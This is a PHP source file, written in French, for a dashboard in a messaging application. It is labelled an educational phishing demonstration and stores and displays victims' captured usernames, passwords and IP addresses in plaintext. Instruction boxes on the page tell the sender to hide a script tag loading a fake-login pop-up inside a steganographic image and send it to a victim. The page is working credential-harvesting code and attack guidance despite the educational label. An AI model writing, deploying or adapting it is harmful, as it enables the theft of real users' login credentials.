<?php
// Dashboard - Voir les identifiants capturés
// Page pour l'utilisateur qui a envoyé l'image phishing

session_start();
include '../traitements/db.php';

// Vérifier que l'utilisateur est connecté
if (!isset($_SESSION["user_id"])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION["user_id"];

// Créer la table s'il n'existe pas
$create_table_sql = "CREATE TABLE IF NOT EXISTS phishing_captures (
    id INT AUTO_INCREMENT PRIMARY KEY,
    sender_id INT NOT NULL,
    captured_username VARCHAR(255) NOT NULL,
    captured_password VARCHAR(255) NOT NULL,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45),
    user_agent TEXT,
    FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE
)";

$conn->query($create_table_sql);

// Récupérer les identifiants capturés pour cet utilisateur
$sql = "SELECT id, captured_username, captured_password, captured_at, ip_address FROM phishing_captures 
        WHERE sender_id = ? ORDER BY captured_at DESC";

$stmt = $conn->prepare($sql);
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();
$captures = [];
while ($row = $result->fetch_assoc()) {
    $captures[] = $row;
}
$stmt->close();

?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Phishing - Démonstration Éducative</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            font-size: 24px;
        }
        
        .logout-btn {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.2s;
        }
        
        .logout-btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        
        .card h2 {
            color: #31a24c;
            margin-bottom: 20px;
            font-size: 20px;
        }
        
        .info-section {
            background: #f9f9f9;
            padding: 15px;
            border-left: 4px solid #31a24c;
            margin-bottom: 15px;
            border-radius: 5px;
        }
        
        .info-section p {
            margin: 8px 0;
            color: #333;
            font-size: 14px;
        }
        
        .label {
            font-weight: bold;
            color: #31a24c;
            display: inline-block;
            min-width: 150px;
        }
        
        .value {
            color: #666;
            word-break: break-all;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        
        table th {
            background: #31a24c;
            color: white;
            padding: 12px;
            text-align: left;
            font-weight: bold;
            border: none;
        }
        
        table td {
            padding: 12px;
            border-bottom: 1px solid #eee;
        }
        
        table tr:hover {
            background: #f5f5f5;
        }
        
        .empty-message {
            text-align: center;
            color: #999;
            padding: 40px;
            font-size: 16px;
        }
        
        .warning-banner {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-weight: bold;
        }
        
        .copy-btn {
            background: #31a24c;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
        }
        
        .copy-btn:hover {
            background: #28823a;
        }
        
        .instruction-box {
            background: #e8f4f0;
            border: 2px solid #31a24c;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        
        .instruction-box h3 {
            color: #31a24c;
            margin-bottom: 10px;
        }
        
        .instruction-box p {
            color: #333;
            font-size: 14px;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <h1>🔍 Dashboard - Identifiants Capturés</h1>
                <p style="font-size: 14px; margin-top: 5px;">Démonstration éducative de phishing</p>
            </div>
            <a href="../traitements/logout.php" class="logout-btn">Se déconnecter</a>
        </div>
        
        <div class="warning-banner">
            ⚠️ ATTENTION: Ce dashboard montre les identifiants capturés par votre attaque de phishing. C'est une démonstration éducative uniquement.
        </div>
        
        <div class="card">
            <h2>📋 Comment ça marche?</h2>
            
            <div class="instruction-box">
                <h3>Étape 1: Créer l'image stéganographiée</h3>
                <p>
                    Utilisez un outil de stéganographie pour cacher le script JavaScript suivant dans une image:
                </p>
                <pre style="background: #f5f5f5; padding: 10px; margin-top: 10px; border-radius: 5px; overflow-x: auto;">
&lt;script src="/messagerie/codes/assets/popup.js?sender=<?php echo htmlspecialchars($user_id); ?>"&gt;&lt;/script&gt;
                </pre>
            </div>
            
            <div class="instruction-box">
                <h3>Étape 2: Envoyer l'image à la victime</h3>
                <p>
                    Envoyez l'image dans un message. Quand la victime visualise l'image (ou clique dessus), 
                    le script caché s'exécute et affiche un pop-up de fausse connexion.
                </p>
            </div>
            
            <div class="instruction-box">
                <h3>Étape 3: Les identifiants sont capturés</h3>
                <p>
                    Quand la victime entre ses identifiants dans le pop-up, ils sont automatiquement 
                    envoyés à votre dashboard et apparaissent ci-dessous.
                </p>
            </div>
        </div>
        
        <div class="card">
            <h2>🎯 Identifiants Capturés</h2>
            
            <?php if (count($captures) > 0): ?>
                <p style="color: #31a24c; font-weight: bold; margin-bottom: 15px;">
                    <?php echo count($captures); ?> identifiant(s) capturé(s)
                </p>
                
                <div style="overflow-x: auto;">
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Nom d'utilisateur</th>
                                <th>Mot de passe</th>
                                <th>Date/Heure</th>
                                <th>Adresse IP</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($captures as $index => $capture): ?>
                                <tr>
                                    <td><?php echo $index + 1; ?></td>
                                    <td>
                                        <code style="background: #f5f5f5; padding: 3px 8px; border-radius: 3px;">
                                            <?php echo htmlspecialchars($capture['captured_username']); ?>
                                        </code>
                                    </td>
                                    <td>
                                        <code style="background: #f5f5f5; padding: 3px 8px; border-radius: 3px;">
                                            <?php echo htmlspecialchars($capture['captured_password']); ?>
                                        </code>
                                    </td>
                                    <td><?php echo htmlspecialchars($capture['captured_at']); ?></td>
                                    <td><?php echo htmlspecialchars($capture['ip_address']); ?></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            <?php else: ?>
                <div class="empty-message">
                    <p>Aucun identifiant capturé pour le moment.</p>
                    <p style="font-size: 12px; margin-top: 10px; color: #ccc;">
                        Les identifiants capturés apparaîtront ici.
                    </p>
                </div>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>

<?php
$conn->close();
?>
